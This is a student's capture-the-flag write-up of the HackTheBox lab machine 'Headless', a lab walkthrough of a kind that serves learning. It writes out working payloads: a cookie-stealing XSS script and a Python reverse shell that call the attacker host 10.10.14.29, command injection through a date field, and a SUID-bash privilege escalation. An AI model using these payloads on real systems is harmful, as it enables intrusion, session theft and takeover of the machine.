Hi my name is Jack Buchanan, I am a student/researcher and this is how i exploited the HackTheBox system Headless. 


with the target IP address of 10.10.11.8 I started my initial enumeration of the machine.

Enumeration: 

I started this process by first running an nmap command. !


This was the result of the nmap scan which indicates that port 22/ssh is open and Port 5000 is open the nmap scan indicates it is running is python-Werkzeug which upon lookup is a set of python libraries used for hosting a web application using python 3.11.2 and Werkzeug/2.2.2. Upon visiting the webserver under port 5000 I am greeted with a contact support form in where I can enter First Name, Last Name, email, Phone number and A message. Upon doing some exploit research on the specific version of Wekzeug i found a cve that allows for remote code execution. [  
CVE-2024-34069
(https://www.cve.org/CVERecord?id=CVE-2024-34069)

I didnt really get much from that CVE so now to fuzz the contact page to see if I can find a vulnerability in its input sanitation. 

Then I run the command. 
wfuzz -c -z file,./SecLists/Fuzzing/XSS/XSS-BruteLogic.txt -d "fname=My&lname=Name&email=email%40email.com&phone=111111111&message=FUZZ" --hw 999 --hh 999 --hs 999 http://10.10.11.8:5000/support 


Which indicates that xss attacks are successful. So i go the webpage and try to do a basic XSS attack in the body 
<script>alert(1)</script> but upon entering this it says

We see that Headers are displayed on the page whereas the content is not. Leading me to believe we could put our payload inside of the User-Agent header. We see that when doing this it works verifying a stored XSS vulnerability.


 I will now try to find the subdomain which requires a valid is_admin cookie. First let me Fuzz this webpage to find it

ffuf -w subdomains-top1million-5000.txt -u http://FUZZ.10.10.11.8:5000/ -H "Host: FUZZ.10.10.11.8:5000" -mc 200,401,403 -fs 0



and i found it 
http://10.10.11.8:5000/dashboard



**Initial Foothold:**  

Now im gonna try to steal the is_admin cookie through a blind XSS attack on the Hacking support page.  I found a xss script that should be able to steal cookies online so lets try. 
<script>var i=new Image(); i.src="http://10.10.14.29:5000/?cookie="+btoa(document.cookie);
</script>. 

then we spin up a python server on port 5000 to serve to. 


Then i recieve two cookies.

10.10.14.29 - - [04/Aug/2024 00:02:05] "GET /?cookie=aXNfYWRtaW49SW5WelpYSWkudUFsbVhsVHZtOHZ5aWhqTmFQRFdudkJfWmZz HTTP/1.1" 200 -
10.10.11.8 - - [04/Aug/2024 00:02:23] "GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200 -

im gonna assume the second one is correct here since I believe the first one is my cookie because of how quick I got it. This took me alot of fiddling around with different XSS scripts and different headers. 


Upon Trying the cookie I get an # Internal Server Error and i realize that the cookie is probaly encoded somehow. Looks like base64 since there is a = at the end.

and get is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0


Which gives me access to the Administrator dashboard. which has an Generate Report button and allows you to select a date to generate a Website Health Report. Upon Examing the POST request that happens when you hit the button i see that 
POST /dashboard HTTP/1.1

date=2023-09-15

I get this request. The date input is what i will now target. 


so i change the data parameter to include a second command which is.
2023-09-15;whoami. Which reveals the user is running under dvir. I know now that this parameter is not properly sanitized and can try to get a reverse shell. 


Since I know the server is running a python intreprer i go to revshells and get a python rev shell.
date=2023-09-15;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.29",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'

I enter this and setup my netcat listerner for port 1337 and I receive a shell back.

I get the user flag easily inside of the users directory. 

i then stabilize the shell with. 
python3 -c 'import pty;pty.spawn("/bin/bash")'


**Privilege Escalation:** 

i do sudo -l and see that i can run /usr/bin/syscheck as sudo without a password \


I then do cat /usr/bin/syscheck to view the contents of the script and see

#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0


I use chatgpt to analyze the script and see`syscheck`Â calls another bash script called initdb.sh


I will now write my own initdb.sh that executes a command in order for me to escalate privledges with this command below.

echo '#!/bin/bash' > initdb.sh
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> initdb.sh
chmod +x initdb.sh


I then run /usr/bin/syscheck and to access the root shell i setup i use. 
/tmp/rootbash -p


And i get root! 


and find root.txt inside of /root

This is my first writeup! I wanted to choose an easier CTF so I wouldnt have much of a challenge in doing a writeup. This is the first to come but certanilty not the last! I hope that I could help anyone who needed it! 
Thank you for reading, Jack Buchanan.
